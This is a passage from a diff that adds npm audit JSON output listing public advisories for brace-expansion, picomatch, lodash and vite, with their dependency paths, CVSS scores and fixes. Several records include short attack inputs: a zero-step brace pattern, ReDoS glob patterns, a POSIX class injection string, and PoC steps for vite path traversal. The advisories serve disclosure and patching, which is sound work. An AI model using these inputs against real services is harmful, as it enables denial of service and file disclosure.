+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n- https://github.com/juliangruber/brace-expansion/issues/98\n- https://github.com/juliangruber/brace-expansion/pull/95\n- https://github.com/juliangruber/brace-expansion/pull/96\n- https://github.com/juliangruber/brace-expansion/pull/97\n- https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5\n- https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2\n- https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33750\n- https://github.com/advisories/GHSA-f886-m6hf-6m8v",
+      "created": "2026-03-26T18:29:42.000Z",
+      "id": 1115540,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "reported_by": null,
+      "title": "brace-expansion: Zero-step sequence causes process hang and memory exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33750"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": "<1.1.13",
+      "github_advisory_id": "GHSA-f886-m6hf-6m8v",
+      "recommendation": "Upgrade to version 1.1.13 or later",
+      "patched_versions": ">=1.1.13",
+      "updated": "2026-03-27T21:38:55.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-f886-m6hf-6m8v"
+    },
+    "1115551": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ". > lint-staged@16.4.0 > picomatch@4.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115551,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33672"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115554": {
+      "findings": [
+        {
+          "version": "4.0.3",
+          "paths": [
+            ". > lint-staged@16.4.0 > picomatch@4.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115554,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33671"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115806": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [
+            ". > @langchain/community@1.1.27 > lodash@4.17.23",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > lodash@4.17.23",
+            "server > @langchain/community@1.1.27 > lodash@4.17.23"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115806,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4800"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1115810": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [
+            ". > @langchain/community@1.1.27 > lodash@4.17.23",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-flowtype@8.0.3 > lodash@4.17.23",
+            "server > @langchain/community@1.1.27 > lodash@4.17.23"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-f23m-r3pf-42rh\n- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2950\n- https://github.com/advisories/GHSA-f23m-r3pf-42rh",
+      "created": "2026-04-01T23:50:27.000Z",
+      "id": 1115810,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2950"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": "<=4.17.23",
+      "github_advisory_id": "GHSA-f23m-r3pf-42rh",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:50:28.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-f23m-r3pf-42rh"
+    },
+    "1116231": {
+      "findings": [
+        {
+          "version": "8.0.4",
+          "paths": [
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > vite@8.0.4",
+            ". > @vitejs/plugin-react@6.0.1 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > vite@8.0.4",
+            ". > vite@8.0.4",
+            ". > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > vitest@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > vite@8.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9\n- https://github.com/vitejs/vite/pull/22161\n- https://github.com/vitejs/vite/commit/79f002f2286c03c88c7b74c511c7f9fc6dc46694\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39365\n- https://github.com/advisories/GHSA-4w7w-66w2-5vf9",
+      "created": "2026-04-06T18:03:46.000Z",
+      "id": 1116231,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAny files ending with `.map` even out side the project can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with `.map` and the path is predictable\n\n### Details\n\nIn Vite v7.3.1, the dev server’s handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.\n\n### PoC\n1. Create a minimal PoC sourcemap outside the project root\n    ```bash\n    cat > /tmp/poc.map <<'EOF'\n    {\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\n    EOF\n    ```\n2. Start the Vite dev server (example)\n    ```bash\n    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n    ```\n3. Confirm that direct `/@fs` access is blocked by `strict` (returns 403)\n    <img width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" />\n4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`\n    <img width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Path Traversal in Optimized Deps `.map` Handling",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39365"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.0.0 <=8.0.4",
+      "github_advisory_id": "GHSA-4w7w-66w2-5vf9",
+      "recommendation": "Upgrade to version 8.0.5 or later",
+      "patched_versions": ">=8.0.5",
+      "updated": "2026-04-07T22:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-4w7w-66w2-5vf9"
+    },
+    "1116233": {
+      "findings": [
+        {
+          "version": "8.0.4",
+          "paths": [
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @stryker-mutator/vitest-runner@9.6.0 > vitest@4.1.2 > vite@8.0.4",
+            ". > @vitejs/plugin-react@6.0.1 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > @vitest/coverage-v8@4.1.2 > vitest@4.1.2 > vite@8.0.4",
+            ". > vite@8.0.4",
+            ". > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            ". > vitest@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > @vitest/mocker@4.1.2 > vite@8.0.4",
+            "server > vitest@4.1.2 > vite@8.0.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
